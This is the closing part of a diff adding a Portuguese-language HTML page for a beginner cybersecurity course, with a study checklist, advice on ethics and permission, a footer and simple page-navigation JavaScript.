+        <li>Escreva um resumo das 3 primeiras vulnerabilidades que aprendeu (SQLi, XSS, CSRF) em suas próprias palavras</li>
+      </ul>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">✅</span> Primeiro mês</div>
+      <ul style="padding-left:1.2rem;color:var(--text2);font-size:0.9rem;">
+        <li>Complete trilha "Complete Beginner" ou "Introduction to Cyber Security" no TryHackMe</li>
+        <li>Faça 5 máquinas do HackTheBox "Starting Point" (se possível, primeiro máquina "Meow" ou "Fawn")</li>
+        <li>Instale e explore OWASP Juice Shop — resolva 3 challenges</li>
+        <li>Aprenda Python básico (se não sabe) — foque em sockets, requests, argparse (básico para scripts de segurança)</li>
+        <li>Explore um fórum ou comunidade (Reddit, Discord, Slack de segurança) — faça perguntas</li>
+      </ul>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">✅</span> Primeiros 3–6 meses</div>
+      <ul style="padding-left:1.2rem;color:var(--text2);font-size:0.9rem;">
+        <li>Alcance o primeiro certificado (Security+ ou eJPT — dependendo do foco)</li>
+        <li>Escreva write-ups para desafios que resolver (portfólio público)</li>
+        <li>Comece a contribuir em projetos open-source de segurança (mesmo que pequeno)</li>
+        <li>Participe de um CTF (mesmo que online, de boa-fé)</li>
+        <li>Pesquise vagas de estágio/trainee em segurança e veja o que pedem — monte lista de lacunas</li>
+        <li>Construa rede: conecte-se com profissionais, participe de events (BSides, meetups online)</li>
+      </ul>
+    </div>
+
+  </div>
+
+  <div class="callout warning" style="margin-top:1.5rem;">
+    <strong>⚠️ O que NÃO fazer:</strong>
+    <ul style="padding-left:1.2rem;color:var(--text2);font-size:0.9rem;margin-top:0.3rem;">
+      <li>Não espere ter "tudo aprendido" para aplicar — a aprendizagem na área é contínua</li>
+      <li>Não teste em sistemas sem permissão — nunca, nunca</li>
+      <li>Não desconsidere o básico (redes, Linux, HTTP) em busca de técnicas sofisticadas</li>
+      <li>Não se isole — a comunidade é essencial para aprender e crescer</li>
+      <li>Não compare seu progresso com de outros — cada pessoa tem ritmo, base e contexto diferentes</li>
+    </ul>
+  </div>
+
+  <div class="callout info">
+    <strong>📌 Mindset do profissional de segurança:</strong>
+    <ul style="padding-left:1.2rem;color:var(--text2);font-size:0.9rem;margin-top:0.3rem;">
+      <li>"Como isso funciona?" — sana curiosidade constante</li>
+      <li>"O que aconteceria se...?" — pensamento de cenário adversário</li>
+      <li>"Como eu verifico isso?" — ceticismo e validação</li>
+      <li>"Onde está a evidência?" — baseada em evidências, não em intuição</li>
+      <li>"Como eu comunico isso para quem não entende?" — tradução técnica para negócio</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- RODAPÉ                                                 -->
+<!-- ══════════════════════════════════════════════════ -->
+<footer class="footer">
+  <p>
+    <strong style="color:var(--text);">CyberShield — Curso de Cybersecurity do 0 ao Avançado</strong><br>
+    Material educacional para fins legítimos de aprendizado.<br>
+    Sempre pratique em ambientes próprios ou com permissão explícita.<br>
+    Respeite a lei (Lei 12.737/2012 no Brasil) e códigos de ética da área.<br><br>
+    <span style="color:var(--text2);">Atualizado: set/2026 · Licença: uso pessoal e educacional · compartilhe com atribuição.</span>
+  </p>
+</footer>
+
+</main>
+
+<!-- ===== JAVASCRIPT ===== -->
+<script>
+  // Toggle soluções dos exercícios
+  function toggleSol(btn) {
+    const content = btn.nextElementSibling;
+    content.classList.toggle('show');
+    btn.textContent = content.classList.contains('show')
+      ? 'Esconder resposta'
+      : 'Mostrar resposta modelo';
+  }
+
+  // Navegação suave entre tabs
+  document.querySelectorAll('.nav-tab').forEach(tab => {
+    tab.addEventListener('click', function(e) {
+      e.preventDefault();
+      document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+      this.classList.add('active');
+      const target = this.getAttribute('href');
+      if (target && target.startsWith('#')) {
+        document.querySelector(target).scrollIntoView({ behavior: 'smooth' });
+      }
+    });
+  });
+
+  // Animação de entrada das seções (Intersection Observer)
+  const sections = document.querySelectorAll('.section');
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        entry.target.style.animationPlayState = 'running';
+      }
+    });
+  }, { threshold: 0.1 });
+
+  sections.forEach(s => {
+    s.style.animation = 'none';
+    s.offsetHeight; /* trigger reflow */
+    s.style.animation = 'fadeUp 0.5s ease forwards';
+    s.style.animationPlayState = 'paused';
+    observer.observe(s);
+  });
+</script>
+
+</body>
+</html>
